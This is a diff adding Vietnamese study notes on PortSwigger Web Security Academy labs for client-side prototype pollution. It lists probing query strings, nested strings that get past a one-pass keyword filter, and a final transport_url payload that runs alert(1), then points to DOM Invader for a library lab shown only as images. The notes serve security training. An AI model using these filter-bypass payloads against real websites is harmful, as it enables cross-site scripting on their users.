@@ -172,12 +172,46 @@ https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototy
 
 Đầu tiên là tìm source:
 
+Thử vài trường hợp những không thay đổi được `Object.prototype`:
+```
+/?__proto__[foo]=bar
+/?__proto__.foo=bar
+/?constructor.prototype.foo=bar
+/?constructor[prototype][foo]=bar
+```
 
+Tìm các file js được import ta thấy nó có hàm loại bỏ các kí tự:\
+![alt text](image-14.png)
 
+Nhưng hàm này lại không lặp lại nhiều lần từ đó ta thử các trường hợp:
+```
+/?__pro__proto__to__[foo]=bar
+/?__pro__proto__to__.foo=bar
+/?constconstructorructor[protoprototypetype][foo]=bar
+/?constconstructorructor.protoprototypetype.foo=bar
+```
 
+Và cuối cùng thêm payload: `/?__pro__proto__to__[transport_url]=data:,alert(1);`
 
+## Prototype pollution in external libraries
 
+Như chúng tôi đã đề cập, các tiện ích ô nhiễm nguyên mẫu có thể xuất hiện trong các thư viện của bên thứ ba được ứng dụng nhập vào. Trong trường hợp này, chúng tôi đặc biệt khuyên bạn nên sử dụng các tính năng ô nhiễm nguyên mẫu của `DOM Invader` để xác định nguồn và tiện ích. Không chỉ nhanh hơn nhiều mà còn đảm bảo bạn sẽ không bỏ sót các lỗ hổng mà nếu không sẽ cực kỳ khó nhận thấy.
 
+---
+
+## Ví dụ 4: Client-side prototype pollution in third-party libraries
+
+https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries
+
+Bài này ta sẽ sử dụng DOM Invader vì nếu tìm thủ công sẽ rất khó vì số lượng library và dòng code khá lớn.
+
+![alt text](image-15.png)
+
+![alt text](image-16.png)
+
+![alt text](image-17.png)
+
+![alt text](image-18.png)
 
 
 
